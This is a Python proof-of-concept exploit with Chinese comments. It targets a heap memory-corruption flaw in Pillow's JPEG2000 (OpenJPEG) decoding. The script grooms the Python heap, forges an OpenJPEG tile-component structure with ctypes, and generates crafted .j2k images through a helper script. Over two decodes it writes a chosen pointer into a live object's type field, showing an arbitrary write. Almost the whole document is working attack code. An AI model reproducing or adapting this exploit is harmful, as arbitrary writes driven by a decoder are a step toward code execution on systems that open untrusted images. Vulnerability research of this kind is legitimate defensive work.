#!/usr/bin/env python3
# 两段式写：用两次解码把 0xa21690（3 字节指针）写进一个【活对象】的 ob_type(+8)
#   段1: data = victim+8  写 [90,16,00,00,00,00,00,00]
#   段2: data = victim+10 写 [a2,00,00,00,...]
#   => victim+8 变成 0x00a21690 = PyByteArray_Type  => type(victim) 变化（可观测）
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
V = 0x0000A21690            # 目标值：PyByteArray_Type


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def mkfake(scratch_addr, res_addr):
    """伪造 opj_tcd_tilecomp_t（放在 >=512B 的 bytearray 里，地址低、可表达）"""
    buf = bytearray(1024)
    fa = ctypes.addressof((ctypes.c_char * 1024).from_buffer(buf))
    put64(fa + 0x10, 1)              # compno=1, numresolutions=1
    put64(fa + 0x18, 1)              # minimum_num_resolutions
    put64(fa + 0x20, res_addr)       # resolutions -> 伪造零结构
    put64(fa + 0x28, 40)
    put64(fa + 0x30, scratch_addr)   # ★ data -> 目标地址
    put64(fa + 0x38, 0)              # ownsData=0
    put64(fa + 0x40, 4096)
    put64(fa + 0x48, 4096)
    return buf, fa


def groom_and_decode(path, tries=6):
    for t in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t2 for i, t2 in enumerate(good) if i != len(good) // 2]
        Ks2 = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), 0)
    return (None, 0)


# ---------- 1) 受害者：>=512B 的 bytes（brk 堆、地址低）----------
victim = bytes(bytearray(1024))
VADDR = id(victim)
print("[*] victim=%#x  可表达=%s" % (VADDR, VADDR < 0x1000000))
if VADDR >= 0x1000000:
    print("[!] victim 地址太高"); sys.exit(1)
tgt1 = VADDR + 8
tgt2 = VADDR + 0x0a
print("[*] 段1 目标=%#x   段2 目标=%#x   原始 ob_type=%#x" % (tgt1, tgt2, R(VADDR + 8)))

# ---------- 2) 伪造结构 + resolution ----------
fake_buf, FAKE = None, None
res_buf = bytearray(512)
RESADDR = ctypes.addressof((ctypes.c_char * 512).from_buffer(res_buf))
put64(RESADDR + 0x08, 16)
put64(RESADDR + 0x0c, 16)
put64(RESADDR + 0x10, 1)
put64(RESADDR + 0x14, 1)

# ---------- 3) payload 图像：写 [90,16,00,00 ...]（段1）与 [a2,00,...]（段2）----------
# 16 位图像 => 每个 int32 槽低 2 字节可控、高 2 字节为 0
s1 = bytearray(4096)
s1[0x00:0x02] = struct.pack('<H', V & 0xFFFF)          # 0x1690 -> 字节 90 16
s2 = bytearray(4096)
s2[0x00:0x02] = struct.pack('<H', (V >> 16) & 0xFFFF)  # 0x00a2 -> 字节 a2 00

def encode16(byts, path):
    vals = [int.from_bytes(byts[i:i + 4].ljust(4, b'\x00'), 'little') & 0xFFFF for i in range(0, 64, 4)]
    im = Image.new('I;16', (4, 4))
    im.putdata(vals)
    im.save(path, 'JPEG2000')

encode16(s1, '/tmp/p1.j2k')
encode16(s2, '/tmp/p2.j2k')

# ---------- 4) 两段式 ----------
for stage, (patch, tgt) in enumerate([('/tmp/p1.j2k', tgt1), ('/tmp/p2.j2k', tgt2)], 1):
    fake_buf, FAKE = mkfake(tgt, RESADDR)
    A = FAKE - 0x0c
    B = A + 0x1000
    C = A + 0x4000
    r = subprocess.run(['python3', '/tmp/mk13.py', patch, '/tmp/F.j2k', '0', '23',
                        hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
    if 'OK' not in r.stdout:
        print("段%d build 失败: %s" % (stage, (r.stdout + r.stderr)[:60])); sys.exit(1)
    res, ng = groom_and_decode('/tmp/F.j2k')
    print("[*] 段%d: A=%#x FAKE=%#x data=%#x -> 解码=%s 现在 ob_type=%#x"
          % (stage, A, FAKE, tgt, res, R(VADDR + 8)))

print()
print("[*] 最终 victim+8 = %#x  (期望 %#x)" % (R(VADDR + 8), V))
try:
    print("[*] type(victim) =", type(victim))
except BaseException as e:
    print("[*] type() 异常", repr(e)[:60])
if R(VADDR + 8) == V:
    print("\n★★★ 解码器把【指针】写进了活对象：victim 的类型被改成 bytearray")
    print("    => 解码驱动的任意写（指针粒度、两段式）成立 ✓")